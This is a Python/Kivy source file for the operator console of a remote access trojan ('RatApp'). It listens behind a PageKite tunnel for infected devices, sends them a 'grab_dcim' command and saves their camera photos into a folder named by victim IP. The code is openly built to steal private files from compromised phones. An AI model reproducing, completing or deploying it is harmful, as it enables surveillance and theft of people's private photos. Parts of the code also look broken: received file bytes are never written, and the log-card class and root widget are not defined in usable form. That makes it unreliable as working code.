import os, sys, time, socket, struct, threading
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.scrollview import ScrollView
from kivy.uix.widget import Widget
from kivy.core.window import Window
from kivy.lang import Builder
from kivy.clock import Clock

Window.size = (1400, 800)
Window.clearcolor = (0.02, 0.02, 0.04, 1)

HOST = 'myrat5555.pagekite.me'
PORT = 443

FULL_KV = '''
<GlitchLabel@Label>:
    font_name: "RobotoMono-Regular"
    color: 0.9, 0.1, 0.1, 1
    halign: "center"
    valign: "middle"

<CyberButton@Button>:
    font_name: "RobotoMono-Regular"
    font_size: "15sp"
    color: 1, 0.3, 0.3, 1
    size_hint_y: None
    height: 60
    background_normal: ''
    background_color: (0, 0, 0, 0)
    canvas.before:
        Color:
            rgba: 0.5, 0.0, 0.0, 0.2
        RoundedRectangle:
            pos: self.x - 2, self.y - 2
            size: self.width + 4, self.height + 4
            radius: [18, 18, 18, 18]
        Color:
            rgba: 0.08, 0.02, 0.02, 0.9
        RoundedRectangle:
            pos: self.pos
            size: self.size
            radius: [15, 15, 15, 15]
        Color:
            rgba: 0.9, 0.15, 0.15, 0.6
        Line:
            width: 1.5
            rounded_rectangle: [self.x+1, self.y+self.height-2, self.width-2, 2, 1]
        Color:
            rgba: 0.4, 0.0, 0.0, 0.3
        Line:
            width: 1
            rounded_rectangle: [self.x+1, self.y+1, self.width-2, 2, 1]

<MainDashboard>:
    orientation: 'horizontal'
    padding: 20
    spacing: 20

    BoxLayout:
        id: left_panel
        size_hint_x: 0.28
        orientation: 'vertical'
        spacing: 0
        canvas.before:
            Color:
                rgba: 0.04, 0.04, 0.07, 1
            RoundedRectangle:
                pos: self.pos
                size: self.size
                radius: [25, 25, 25, 25]
            Color:
                rgba: 0.8, 0.0, 0.0, 0.15
            RoundedRectangle:
                pos: self.x-4, self.y-4
                size: self.width+8, self.height+8
                radius: [28, 28, 28, 28]
            Color:
                rgba: 0.6, 0.05, 0.05, 0.5
            Line:
                width: 1.5
                dash_offset: 5
                dash_length: 10
                rounded_rectangle: [self.x, self.y, self.width, self.height, 25]

        BoxLayout:
            size_hint_y: 0.15
            orientation: 'vertical'
            padding: 10
            canvas.after:
                Color:
                    rgba: 0.8, 0.1, 0.1, 0.4
                Line:
                    points: self.x+20, self.y+self.height-1, self.x+self.width-20, self.y+self.height-1
                    width: 2
            GlitchLabel:
                text: "█▀▀ LEX-Ω ▄▄█"
                font_size: "26sp"
                bold: True
            Label:
                text: "ADVANCED CONTROL SYSTEM"
                font_name: "RobotoMono-Regular"
                font_size: "11sp"
                color: 0.5, 0.15, 0.15, 1
                halign: "center"

        BoxLayout:
            orientation: 'vertical'
            size_hint_y: 0.65
            padding: 15
            spacing: 15
            Widget:
                size_hint_y: 0.05
            CyberButton:
                text: "  ▶  INITIATE SERVER  "
                on_press: root.start_server()
            CyberButton:
                text: "  ■  TERMINATE SERVER  "
                on_press: root.stop_server()
            CyberButton:
                text: "  ⬇  GRAB DCIM FILES  "
                on_press: root.send_grab_command()
            Widget:
                size_hint_y: 0.15

        BoxLayout:
            orientation: 'vertical'
            size_hint_y: 0.2
            padding: 15
            spacing: 10
            canvas.before:
                Color:
                    rgba: 0.8, 0.1, 0.1, 0.2
                Line:
                    points: self.x+20, self.y+self.height, self.x+self.width-20, self.y+self.height
                    width: 1.5
            Label:
                text: "SYSTEM DIAGNOSTICS"
                font_name: "RobotoMono-Regular"
                font_size: "12sp"
                color: 0.6, 0.1, 0.1, 1
                halign: "center"
                size_hint_y: 0.2
            BoxLayout:
                size_hint_y: 0.4
                padding: 10
                canvas.before:
                    Color:
                        rgba: 0.06, 0.06, 0.1, 1
                    RoundedRectangle:
                        pos: self.pos
                        size: self.size
                        radius: [10, 10, 10, 10]
                Label:
                    text: "STATUS:"
                    font_name: "RobotoMono-Regular"
                    font_size: "13sp"
                    color: 0.5, 0.5, 0.5, 1
                    halign: "center"
                    valign: "middle"
                Label:
                    id: status_label
                    text: "OFFLINE"
                    font_name: "RobotoMono-Regular"
                    font_size: "15sp"
                    color: 0.8, 0.1, 0.1, 1
                    bold: True
                    halign: "center"
                    valign: "middle"
            Label:
                id: time_label
                text: "00:00:00"
                font_name: "RobotoMono-Regular"
                font_size: "20sp"
                color: 0.4, 0.08, 0.08, 1
                halign: "center"

    BoxLayout:
        size_hint_x: 0.72
        orientation: 'vertical'
        spacing: 0
        canvas.before:
            Color:
                rgba: 0.03, 0.03, 0.06, 1
            RoundedRectangle:
                pos: self.pos
                size: self.size
                radius: [25, 25, 25, 25]
            Color:
                rgba: 0.6, 0.0, 0.0, 0.1
            RoundedRectangle:
                pos: self.x-3, self.y-3
                size: self.width+6, self.height+6
                radius: [28, 28, 28, 28]
            Color:
                rgba: 0.9, 0.15, 0.15, 0.3
            Line:
                width: 2
                rounded_rectangle: [self.x, self.y+self.height-3, self.width, 3, 25]
        BoxLayout:
            size_hint_y: 0.08
            padding: 20, 20, 20, 10
            canvas.after:
                Color:
                    rgba: 0.5, 0.05, 0.05, 0.3
                Line:
                    points: self.x+30, self.y, self.x+self.width-30, self.y
                    width: 1
            Label:
                text: "◄ BACKEND TERMINAL LOG ►"
                font_name: "RobotoMono-Regular"
                font_size: "18sp"
                color: 0.9, 0.2, 0.2, 1
                bold: True
                halign: "center"
                valign: "middle"
        ScrollView:
            id: chat_scroll
            do_scroll_x: False
            do_scroll_y: True
            bar_width: 8
            bar_color: 0.6, 0.05, 0.05, 0.5
            bar_inactive_color: 0.2, 0.02, 0.02, 0.3
            scroll_type: ['content', 'bars']
            canvas.before:
                Color:
                    rgba: 0.05, 0.05, 0.08, 1
                RoundedRectangle:
                    pos: self.pos
                    size: self.size
                    radius: [15, 15, 15, 15]
            GridLayout:
                id: chat_grid
                cols: 1
                size_hint_y: None
                height: self.minimum_height
                spacing: 8
                padding: 15

<AdvancedLogCard@BoxLayout>:
    size_hint_y: None
    height: self.minimum_height
    padding: 5, 8, 5, 8
    orientation: 'vertical'
    canvas.before:
        Color:
            rgba: 0.4, 0.0, 0.0, 0.1
        RoundedRectangle:
            pos: self.x+2, self.y-2
            size: self.width, self.height
            radius: [12, 12, 12, 12]
        Color:
            rgba: 0.07, 0.07, 0.11, 0.95
        RoundedRectangle:
            pos: self.pos
            size: self.size
            radius: [10, 10, 10, 10]
        Color:
            rgba: 0.9, 0.2, 0.2, 0.8
        RoundedRectangle:
            pos: self.x, self.y+5
            size: 3, self.height-10
            radius: [2, 2, 2, 2]
    Label:
        text: root.time_stamp
        font_name: "RobotoMono-Regular"
        font_size: "9sp"
        color: 0.4, 0.1, 0.1, 1
        size_hint_y: None
        height: 15
        halign: "left"
        padding_x: 15
    Label:
        text: root.log_message
        font_name: "RobotoMono-Regular"
        font_size: "13sp"
        color: 0.85, 0.85, 0.85, 1
        size_hint_y: None
        height: self.texture_size[1]
        halign: "left"
        valign: "top"
        text_size: self.width - 20, None
        padding_x: 15
        padding_y: 2
'''

class MainDashboard(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.server_active = False
        self.server_socket = None
        self.connected_clients = []
        self.client_threads = []
        self.download_folder = "Extracted_DCIM"
        
        if not os.path.exists(self.download_folder):
            os.makedirs(self.download_folder)
            
        Clock.schedule_interval(self.update_clock, 1)
        Clock.schedule_once(lambda x: self.add_log("System initialized. Awaiting operator commands..."), 0.5)

    def update_clock(self, dt):
        current_time = time.strftime("%H:%M:%S")
        if hasattr(self.ids, 'time_label'):
            self.ids.time_label.text = current_time

    def add_log(self, message):
        if not hasattr(self.ids, 'chat_grid'):
            return
        chat_grid = self.ids.chat_grid
        current_time = time.strftime("%H:%M:%S")
        log_card = AdvancedLogCard(time_stamp=f"[ {current_time} ]", log_message=message)
        chat_grid.add_widget(log_card)
        chat_scroll = self.ids.chat_scroll
        if chat_scroll.parent:
            Clock.schedule_once(lambda x: chat_scroll.scroll_to(log_card), 0.05)

    def start_server(self):
        if not self.server_active:
            self.server_active = True
            # إصلاح: استخدام Clock لتحديث واجهة الكيفي بأمان من أي مسار
            Clock.schedule_once(lambda x: setattr(self.ids.status_label, 'text', "ONLINE"))
            Clock.schedule_once(lambda x: setattr(self.ids.status_label, 'color', (0.1, 0.9, 0.1, 1)))
            self.server_thread = threading.Thread(target=self.initialize_server, daemon=True)
            self.server_thread.start()
        else:
            self.add_log("[WARNING] Server is already running on port 443.")

    def initialize_server(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('0.0.0.0', PORT))
            self.server_socket.listen(5)
            Clock.schedule_once(lambda x: self.add_log(f"Socket bound successfully to 0.0.0.0:{PORT}"))
            Clock.schedule_once(lambda x: self.add_log(f"PageKite tunnel active -> {HOST}"))
            Clock.schedule_once(lambda x: self.add_log("Listening for incoming external payload connections..."))
            
            while self.server_active:
                try:
                    client_sock, client_addr = self.server_socket.accept()
                    Clock.schedule_once(lambda x: self.add_log(f"[CONNECTION] New device joined: {client_addr[0]}:{client_addr[1]}"))
                    self.connected_clients.append(client_sock)
                    client_thread = threading.Thread(target=self.handle_client, args=(client_sock, client_addr), daemon=True)
                    client_thread.start()
                    self.client_threads.append(client_thread)
                except OSError:
                    break 
        except Exception as e:
            Clock.schedule_once(lambda x: self.add_log(f"[FATAL ERROR] {str(e)}"))
            self.stop_server()

    def recv_exact(self, sock, n):
        data = b''
        while len(data) < n:
            packet = sock.recv(n - len(data))
            if not packet: return None
            data += packet
        return data

    def handle_client(self, client_sock, addr):
        ip = addr[0]
        current_file = None
        file_handle = None
        
        while self.server_active:
            try:
                # 1. استقبال حجم الرسالة/الأمر
                raw_len = self.recv_exact(client_sock, 4)
                if not raw_len: break
                
                msg_len = struct.unpack('!I', raw_len)[0]
                if msg_len == 0: continue

                # 2. استقبال نص الأمر
                cmd_data = self.recv_exact(client_sock, msg_len)
                if not cmd_data: break
                data = cmd_data.decode('utf-8')

                if data.startswith("HANDSHAKE"):
                    Clock.schedule_once(lambda x: self.add_log(f"[+] Device {ip} successfully connected."))

                elif data.startswith("FILE_START|"):
                    filename = data.split("|")[1]
                    current_file = filename
                    filepath = os.path.join(self.download_folder, f"{ip}_{filename}")
                    file_handle = open(filepath, 'wb')
                    Clock.schedule_once(lambda x: self.add_log(f"[RECV] Receiving: {filename}"))

                elif data == "FILE_END":
                    if file_handle:
                        file_handle.close()
                        file_handle = None
                        Clock.schedule_once(lambda x: self.add_log(f"[DONE] Saved: {current_file}"))
                        current_file = None

            except Exception as e:
                Clock.schedule_once(lambda x: self.add_log(f"[ERR] Connection lost: {str(e)}"))
                break
                
        if file_handle: file_handle.close()
        Clock.schedule_once(lambda x: self.add_log(f"[DISCONNECTED] Device {ip} dropped."))
        if client_sock in self.connected_clients: self.connected_clients.remove(client_sock)
        client_sock.close()

    def send_grab_command(self):
        if not self.connected_clients:
            self.add_log("[CMD] No active devices connected to grab files.")
            return
        self.add_log(f"[CMD] Sending 'grab_dcim' to {len(self.connected_clients)} device(s)...")
        dead_sockets = []
        for sock in self.connected_clients:
            try:
                cmd = "grab_dcim"
                sock.sendall(struct.pack('!I', len(cmd)) + cmd.encode('utf-8'))
            except:
                dead_sockets.append(sock)
        for sock in dead_sockets:
            self.connected_clients.remove(sock)
            try: sock.close()
            except: pass
        if dead_sockets: self.add_log(f"[CLEANUP] Removed {len(dead_sockets)} dead sockets.")

    def stop_server(self):
        if self.server_active:
            self.server_active = False
            # إصلاح: استخدام Clock لأمان تحديث الواجهة
            Clock.schedule_once(lambda x: setattr(self.ids.status_label, 'text', "OFFLINE"))
            Clock.schedule_once(lambda x: setattr(self.ids.status_label, 'color', (0.8, 0.1, 0.1, 1)))
            
            for sock in self.connected_clients:
                try: sock.close()
                except: pass
            self.connected_clients.clear()
            
            if self.server_socket:
                try: self.server_socket.close()
                except: pass
                
            Clock.schedule_once(lambda x: self.add_log("Server shut down complete."))
        else:
            self.add_log("[ERROR] No active server instance found.")

class RatApp(App):
    def build(self):
        return Builder.load_string(FULL_KV)

if __name__ == '__main__':
    RatApp().run()
